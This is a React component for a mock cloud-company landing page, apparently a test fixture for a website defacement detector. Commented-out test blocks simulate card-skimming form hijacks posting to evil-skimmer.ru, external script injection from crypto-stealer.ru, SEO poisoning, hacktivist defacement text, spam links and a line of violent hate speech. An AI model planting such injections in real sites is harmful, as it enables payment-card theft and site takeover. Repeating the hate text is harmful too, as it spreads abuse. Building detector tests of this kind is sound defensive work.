import React, { useEffect } from "react";

/**
 * 🛡️ MainContent - Professional Landing Page & Defacement Test Mock
 * 
 * This component serves as a beautiful, premium e-commerce/SaaS landing page.
 * It contains cleanly organized, commented-out test blocks for Layer 1 (Structural DOM)
 * and Layer 4 (Semantic NLP) defacement detection scenarios.
 * 
 * To test CyberShield PRO against this component:
 * 1. Uncomment any specific L1 or L4 test block below.
 * 2. Render or capture this page via the Playwright renderer.
 * 3. Verify that the scanner fires the exact expected trigger ID.
 */
const MainContent: React.FC = () => {
  // =========================================================================
  // 🔬 DYNAMIC DOM HEAD MANIPULATION (L1 & L4 META / SCRIPT TEST CASES)
  // =========================================================================
  useEffect(() => {
    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L1-TRG-05] Canonical Link SEO Poisoning
     * Injects an external malicious canonical link to transfer search ranking.
     * Expected Trigger: meta_tag_canonical_change
     * ------------------------------------------------------------------------ */
    /*
    const canonical = document.createElement("link");
    canonical.rel = "canonical";
    canonical.href = "https://spam-seo-hijack.org";
    canonical.id = "test-canonical";
    document.head.appendChild(canonical);
    */

    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L1-TRG-06] Robots De-indexing Sabotage
     * Modifies meta robots to erase the site from Google search index.
     * Expected Trigger: meta_tag_robots_change
     * ------------------------------------------------------------------------ */
    /*
    const robots = document.createElement("meta");
    robots.name = "robots";
    robots.content = "noindex, nofollow";
    robots.id = "test-robots";
    document.head.appendChild(robots);
    */

    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L1-TRG-03] Malicious External JS Injection
     * Injects an unauthorized external JS script (simulates payment skimmer/miner).
     * Expected Trigger: script_injection_new_domain (domain: crypto-stealer.ru)
     * ------------------------------------------------------------------------ */
    /*
    const script = document.createElement("script");
    script.src = "https://crypto-stealer.ru/app.js";
    script.async = true;
    script.id = "test-script";
    document.head.appendChild(script);
    */

    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L4-ADV-02] JS Hidden Manifesto / Slogans
     * Injects JS code containing hacktivist text in comments/strings.
     * Expected Trigger: hacktivist_defacement (extracted via JS semantics)
     * ------------------------------------------------------------------------ */
    /*
    const inlineScript = document.createElement("script");
    inlineScript.id = "test-inline-script";
    inlineScript.innerHTML = `
      // CyberShield PRO Test: Hidden JS Payload
      console.log("you have been hacked by anonymous cyber team. 0wned by legion.");
    `;
    document.head.appendChild(inlineScript);
    */

    return () => {
      // Cleanup DOM modifications on unmount
      const can = document.getElementById("test-canonical");
      if (can) document.head.removeChild(can);
      const rob = document.getElementById("test-robots");
      if (rob) document.head.removeChild(rob);
      const scr = document.getElementById("test-script");
      if (scr) document.head.removeChild(scr);
      const inl = document.getElementById("test-inline-script");
      if (inl) document.head.removeChild(inl);
    };
  }, []);

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans antialiased selection:bg-indigo-500 selection:text-white">
      {/* =====================================================================
        * 🟢 LEGITIMATE BASELINE HEADER (STATIC ZONE)
        * ===================================================================== */}
      <nav id="header" className="sticky top-0 z-50 backdrop-blur-xl bg-slate-950/80 border-b border-slate-800">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-500 via-purple-500 to-pink-500 flex items-center justify-center font-bold text-xl shadow-lg shadow-indigo-500/30">
              ⚡
            </div>
            <span className="text-2xl font-extrabold tracking-tight bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">
              ApexCloud
            </span>
          </div>

          <div className="hidden md:flex items-center space-x-8 font-medium text-slate-300">
            <a href="#features" className="hover:text-indigo-400 transition-colors">Features</a>
            <a href="#solutions" className="hover:text-indigo-400 transition-colors">Solutions</a>
            <a href="#pricing" className="hover:text-indigo-400 transition-colors">Pricing</a>
            <a href="#company" className="hover:text-indigo-400 transition-colors">Company</a>
          </div>

          <div className="flex items-center space-x-4">
            <button className="px-5 py-2.5 rounded-xl border border-slate-700 font-semibold text-slate-200 hover:bg-slate-800 transition-all shadow-sm">
              Sign In
            </button>
            <button className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-indigo-600 to-purple-600 font-semibold text-white hover:opacity-90 shadow-lg shadow-indigo-600/30 transition-all">
              Get Started
            </button>
          </div>
        </div>
      </nav>

      {/* =====================================================================
        * 🚨 LAYER 1 & LAYER 4 DEFACEMENT TEST SUITE (DOM BODY MOCKS)
        * ===================================================================== */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L1-TRG-01] Payment Form Hijacking (Cross-Apex)
        * Alters checkout form action to an external skimmer server.
        * Expected Trigger: form_action_change_payment (reason: cross_apex)
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-6 bg-red-950/80 border border-red-600 rounded-2xl max-w-4xl mx-auto my-8">
        <h3 className="text-xl font-bold text-red-400 mb-2">⚠️ L1 Test Case 1: Cross-Apex Form Action Hijack</h3>
        <form action="https://evil-skimmer.ru/steal.php" method="POST">
          <input type="text" name="cc_num" placeholder="Card Number" className="p-2 text-black rounded mb-2 w-full" />
          <button type="submit" className="bg-red-600 text-white px-4 py-2 rounded font-bold">Submit Payment</button>
        </form>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L1-TRG-02] Payment Form HTTP Downgrade
        * Alters checkout form action from secure HTTPS to insecure HTTP.
        * Expected Trigger: form_action_change_payment (reason: scheme_downgrade)
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-6 bg-amber-950/80 border border-amber-600 rounded-2xl max-w-4xl mx-auto my-8">
        <h3 className="text-xl font-bold text-amber-400 mb-2">⚠️ L1 Test Case 2: Insecure HTTP Scheme Downgrade</h3>
        <form action="http://apexcloud.com/checkout/process" method="POST">
          <input type="text" name="data" placeholder="Secure Info" className="p-2 text-black rounded mb-2 w-full" />
          <button type="submit" className="bg-amber-600 text-white px-4 py-2 rounded font-bold">Process Secure Order</button>
        </form>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-TAX-02] Hacktivist Defacement (English)
        * Injects prominent hacktivist slogans & team greetings.
        * Expected Trigger: hacktivist_defacement (Class: hacktivist)
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-12 bg-black border-4 border-green-500 max-w-4xl mx-auto my-8 text-center font-mono rounded-2xl shadow-2xl shadow-green-500/20">
        <h1 className="text-5xl font-black text-green-500 animate-pulse mb-4">HACKED BY ANONYMOUS CYBER TEAM</h1>
        <p className="text-2xl text-green-400 mb-4">0wned by Legion. Your security is a joke. We are anonymous, expect us.</p>
        <p className="text-lg text-slate-400">Greetz to all cyber warriors. You have been hacked!</p>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-TAX-03 & 04] Multilingual Hacktivist (Hindi / Bengali)
        * Injects non-English defacement text to verify multilingual NLP models.
        * Expected Trigger: hacktivist_defacement (Languages: hi, bn)
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-8 bg-slate-900 border-2 border-red-500 max-w-4xl mx-auto my-8 rounded-2xl text-center">
        <h2 className="text-3xl font-extrabold text-red-500 mb-4">⚠️ हैक किया गया | হ্যাক করা হয়েছে</h2>
        <p className="text-xl text-slate-200 mb-2">साइट हैक कर ली गई है। आपकी सुरक्षा प्रणाली बेहद कमजोर है।</p>
        <p className="text-xl text-slate-300">আপনার নিরাপত্তা দুর্বল। আমরা আপনাকে দেখছি।</p>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-TRG-01] Tier-1 Manifesto Defacement Attack
        * Injects long-form political / seizure manifesto text (>100 chars).
        * Expected Trigger: defacement_manifesto_detected
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-10 bg-zinc-900 border-l-8 border-purple-600 max-w-4xl mx-auto my-8 rounded-2xl shadow-xl">
        <h2 className="text-3xl font-bold text-purple-400 mb-4">OFFICIAL SEIZURE NOTICE & MANIFESTO</h2>
        <p className="text-lg text-slate-300 leading-relaxed">
          We have taken control. This site has been seized by the cyber liberation front. 
          Message to the world: your security means nothing against our collective will. 
          Government corruption and corporate greed will no longer remain unanswered. Operation liberated is now fully active.
        </p>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-TAX-06] SEO Pharma / Casino Spam
        * Injects black-hat affiliate marketing keywords combined with links.
        * Expected Trigger: seo_spam_match (Class: spam)
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-8 bg-blue-950/80 border border-blue-500 max-w-4xl mx-auto my-8 rounded-2xl">
        <h3 className="text-xl font-bold text-blue-400 mb-3">💊 L4 Test Case: SEO Black-Hat Spam</h3>
        <p className="text-slate-300 mb-3">
          Looking for genuine medical products? Buy cheap viagra online today without prescription pills. 
          Secure fast delivery. Double your bitcoin with our premium crypto trading bot and betting bonus online casino games.
        </p>
        <div className="flex space-x-4 text-blue-300 underline">
          <a href="http://spam-casino.com">Online Casino</a>
          <a href="http://pills-store.com">Cheap Pills</a>
          <a href="http://crypto-scam.net">Double BTC</a>
          <a href="http://viagra-buy.org">Buy Now</a>
          <a href="http://betting-bonus.com">Betting Bonus</a>
        </div>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-TAX-07] Hate Speech / Offensive Content
        * Injects severe offensive text and hate speech.
        * Expected Trigger: offensive_content (Class: offensive)
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-8 bg-red-900 border border-red-500 max-w-4xl mx-auto my-8 rounded-2xl text-white font-bold">
        <h3 className="text-2xl mb-2">🛑 L4 Test Case: Hate Speech</h3>
        <p className="text-lg">Death to all infidel scum. Racial cleansing must begin immediately. Nuke the entire continent.</p>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-TAX-08] Bot Parking / Template Placeholder
        * Injects automated domain parking notices.
        * Expected Trigger: Classified as 'bot'
        * --------------------------------------------------------------------- */}
      {/*
      <div className="p-8 bg-slate-800 border border-slate-600 max-w-4xl mx-auto my-8 rounded-2xl text-center">
        <h3 className="text-2xl font-bold text-amber-400 mb-2">Under Construction</h3>
        <p className="text-slate-300">Site is temporarily unavailable. Coming soon. Please check back later. Lorem ipsum dolor sit amet.</p>
      </div>
      */}

      {/* ---------------------------------------------------------------------
        * [UNCOMMENT TO TEST L4-ADV-01] Hidden Cloaked SEO Spam
        * Injects hidden elements (display:none) to verify DOM de-cloaking.
        * Expected: Successfully decomposed during text extraction.
        * --------------------------------------------------------------------- */}
      {/*
      <div style={{ display: "none" }} hidden>
        buy cialis cheap viagra online casino crypto double your bitcoin betting bonus without prescription
      </div>
      */}


      {/* =====================================================================
        * 🟢 LEGITIMATE BASELINE HERO & CONTENT (DYNAMIC ZONE)
        * ===================================================================== */}
      <main id="main-content" className="relative pb-24 overflow-hidden">
        {/* Decorative Gradients */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[500px] bg-gradient-to-tr from-indigo-600/20 via-purple-600/20 to-pink-600/10 rounded-full blur-[120px] pointer-events-none -z-10" />

        <div className="max-w-7xl mx-auto px-6 pt-20 text-center">
          <div className="inline-flex items-center space-x-2 px-4 py-2 rounded-full bg-slate-900/90 border border-slate-800 mb-8 shadow-inner">
            <span className="flex h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
            <span className="text-xs font-semibold text-slate-300 tracking-wider uppercase">Next-Generation Cloud Platform</span>
          </div>

          <h1 className="text-6xl md:text-8xl font-black tracking-tight mb-8 leading-[1.1] max-w-5xl mx-auto bg-gradient-to-b from-white via-slate-100 to-slate-400 bg-clip-text text-transparent">
            Secure Cloud Infrastructure for High-Velocity Teams.
          </h1>

          <p className="text-xl md:text-2xl text-slate-400 max-w-3xl mx-auto mb-12 font-normal leading-relaxed">
            Deploy scalable web applications, enterprise databases, and AI microservices with military-grade zero-trust security and sub-millisecond global latency.
          </p>

          <div className="flex flex-col sm:flex-row items-center justify-center space-y-4 sm:space-y-0 sm:space-x-6 mb-20">
            <button className="w-full sm:w-auto px-8 py-4 rounded-2xl bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 font-bold text-lg text-white shadow-xl shadow-indigo-500/25 hover:opacity-95 transition-all">
              Start Free Enterprise Trial
            </button>
            <button className="w-full sm:w-auto px-8 py-4 rounded-2xl bg-slate-900/90 border border-slate-700/80 font-bold text-lg text-slate-200 hover:bg-slate-800/80 transition-all">
              Schedule Security Demo
            </button>
          </div>

          {/* Premium Hero Image Banner */}
          <div className="relative mx-auto max-w-6xl rounded-3xl overflow-hidden border border-slate-800 shadow-2xl shadow-indigo-950/50">
            <div className="absolute inset-0 bg-gradient-to-t from-slate-950 via-transparent to-transparent z-10" />
            <img 
              src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?q=80&w=2000&auto=format&fit=crop" 
              alt="Server Infrastructure Dashboard" 
              className="w-full h-[500px] object-cover object-center transform hover:scale-105 transition-transform duration-700" 
            />
            <div className="absolute bottom-8 left-8 right-8 z-20 flex flex-col md:flex-row items-start md:items-center justify-between text-left border-t border-slate-800/80 pt-6 backdrop-blur-md bg-slate-950/60 p-6 rounded-2xl">
              <div>
                <h4 className="text-2xl font-bold text-white mb-1">Global Anycast Data Network</h4>
                <p className="text-slate-300 text-sm">36+ Tier-1 Edge Locations across North America, Europe, and Asia.</p>
              </div>
              <div className="mt-4 md:mt-0 flex space-x-6">
                <div className="text-center md:text-right">
                  <span className="block text-3xl font-extrabold text-indigo-400">99.999%</span>
                  <span className="text-xs uppercase tracking-wider text-slate-400">Uptime SLA</span>
                </div>
                <div className="text-center md:text-right">
                  <span className="block text-3xl font-extrabold text-emerald-400">&lt; 12ms</span>
                  <span className="text-xs uppercase tracking-wider text-slate-400">Avg Latency</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Features Grid Section */}
        <div id="features" className="max-w-7xl mx-auto px-6 mt-32">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-extrabold text-white mb-4">Engineered for Uncompromising Performance</h2>
            <p className="text-slate-400 text-lg max-w-2xl mx-auto">Our purpose-built cloud primitives combine raw compute power with continuous vulnerability detection.</p>
          </div>

          <div className="grid md:grid-cols-3 gap-8">
            <div className="p-8 rounded-3xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm hover:border-indigo-500/50 transition-colors">
              <div className="w-14 h-14 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 text-2xl mb-6 font-bold">
                🔒
              </div>
              <h3 className="text-2xl font-bold text-white mb-3">Zero-Trust Virtual Private Mesh</h3>
              <p className="text-slate-400 leading-relaxed">
                Every workload is isolated within automated cryptographic micro-perimeters, eliminating horizontal breach propagation.
              </p>
            </div>

            <div className="p-8 rounded-3xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm hover:border-purple-500/50 transition-colors">
              <div className="w-14 h-14 rounded-2xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400 text-2xl mb-6 font-bold">
                ⚡
              </div>
              <h3 className="text-2xl font-bold text-white mb-3">Autoscaling Compute Engines</h3>
              <p className="text-slate-400 leading-relaxed">
                Instantaneous scale-from-zero container instances that adapt to traffic spikes in milliseconds without pre-provisioning.
              </p>
            </div>

            <div className="p-8 rounded-3xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm hover:border-pink-500/50 transition-colors">
              <div className="w-14 h-14 rounded-2xl bg-pink-500/10 border border-pink-500/20 flex items-center justify-center text-pink-400 text-2xl mb-6 font-bold">
                🛡️
              </div>
              <h3 className="text-2xl font-bold text-white mb-3">Continuous Defacement Shield</h3>
              <p className="text-slate-400 leading-relaxed">
                6-layer real-time structural and semantic surveillance guarding your DOM and branding against malicious takeovers.
              </p>
            </div>
          </div>
        </div>

        {/* Legitimate Checkout Form Baseline Mock (For L1 Comparison) */}
        <div id="pricing" className="max-w-4xl mx-auto px-6 mt-32">
          <div className="p-10 rounded-3xl bg-gradient-to-b from-slate-900 to-slate-950 border border-slate-800 shadow-2xl relative overflow-hidden">
            <div className="absolute -right-20 -bottom-20 w-80 h-80 bg-indigo-600/10 rounded-full blur-[80px] pointer-events-none" />
            
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 pb-8 border-b border-slate-800">
              <div>
                <span className="text-xs font-bold uppercase tracking-wider px-3 py-1 bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 rounded-full mb-3 inline-block">Enterprise Plan</span>
                <h3 className="text-3xl font-black text-white">Secure Cloud Subscription</h3>
                <p className="text-slate-400 mt-1">Full access to Anycast CDN, WAF, and 6-Layer Detection.</p>
              </div>
              <div className="mt-4 md:mt-0">
                <span className="text-4xl font-extrabold text-white">$499</span>
                <span className="text-slate-400 text-sm"> / month</span>
              </div>
            </div>

            {/* Verified Form Action Baseline */}
            <form action="https://apexcloud.com/checkout/process" method="POST" className="space-y-4">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-slate-400 uppercase mb-2">Company Name</label>
                  <input type="text" placeholder="Acme Corp" className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:border-indigo-500 focus:outline-none transition-colors" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-slate-400 uppercase mb-2">Billing Email</label>
                  <input type="email" placeholder="billing@acme.com" className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:border-indigo-500 focus:outline-none transition-colors" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-400 uppercase mb-2">Secure Card Details</label>
                <div className="flex bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 items-center">
                  <span className="text-slate-500 mr-3 font-mono">💳</span>
                  <input type="text" placeholder="•••• •••• •••• 4242" className="w-full bg-transparent text-white focus:outline-none font-mono" />
                  <span className="text-xs text-slate-500 font-mono">MM/YY CVC</span>
                </div>
              </div>

              <button type="submit" className="w-full py-4 rounded-xl bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 font-bold text-white shadow-lg shadow-indigo-500/20 hover:opacity-95 transition-all mt-4">
                Confirm Secure Payment
              </button>
              <p className="text-center text-xs text-slate-500 mt-2">🔒 Secured with 256-Bit TLS Encryption & Verified Baseline Target.</p>
            </form>
          </div>
        </div>
      </main>

      {/* =====================================================================
        * 🟢 LEGITIMATE FOOTER (STATIC ZONE)
        * ===================================================================== */}
      <footer id="footer" className="border-t border-slate-800/80 bg-slate-950 py-16 text-slate-400 text-sm">
        <div className="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-5 gap-8 mb-12">
          <div className="col-span-2 space-y-4">
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 rounded-lg bg-indigo-600 flex items-center justify-center font-bold text-white shadow-md">
                ⚡
              </div>
              <span className="text-xl font-bold text-white">ApexCloud</span>
            </div>
            <p className="max-w-xs text-slate-400 leading-relaxed">
              Global resilient cloud systems equipped with autonomous vulnerability and defacement prevention.
            </p>
            <p className="text-xs text-slate-500">© 2026 ApexCloud Technologies, Inc. All rights reserved.</p>
          </div>

          <div>
            <h5 className="font-semibold text-slate-200 mb-4 uppercase tracking-wider text-xs">Infrastructure</h5>
            <ul className="space-y-2">
              <li><a href="#cdn" className="hover:text-white transition-colors">Anycast Edge CDN</a></li>
              <li><a href="#compute" className="hover:text-white transition-colors">Serverless Engines</a></li>
              <li><a href="#storage" className="hover:text-white transition-colors">WORM Evidence Store</a></li>
              <li><a href="#network" className="hover:text-white transition-colors">Global Backbone</a></li>
            </ul>
          </div>

          <div>
            <h5 className="font-semibold text-slate-200 mb-4 uppercase tracking-wider text-xs">Security</h5>
            <ul className="space-y-2">
              <li><a href="#l1" className="hover:text-white transition-colors">L1 DOM Structural Shield</a></li>
              <li><a href="#l4" className="hover:text-white transition-colors">L4 NLP Semantic Engine</a></li>
              <li><a href="#compliance" className="hover:text-white transition-colors">WORM Compliance</a></li>
              <li><a href="#zero-trust" className="hover:text-white transition-colors">Zero-Trust Mesh</a></li>
            </ul>
          </div>

          <div>
            <h5 className="font-semibold text-slate-200 mb-4 uppercase tracking-wider text-xs">Legal</h5>
            <ul className="space-y-2">
              <li><a href="#privacy" className="hover:text-white transition-colors">Privacy Architecture</a></li>
              <li><a href="#terms" className="hover:text-white transition-colors">Terms of Service</a></li>
              <li><a href="#sla" className="hover:text-white transition-colors">Uptime SLA</a></li>
              <li><a href="#bounty" className="hover:text-white transition-colors">Bug Bounty</a></li>
            </ul>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default MainContent;
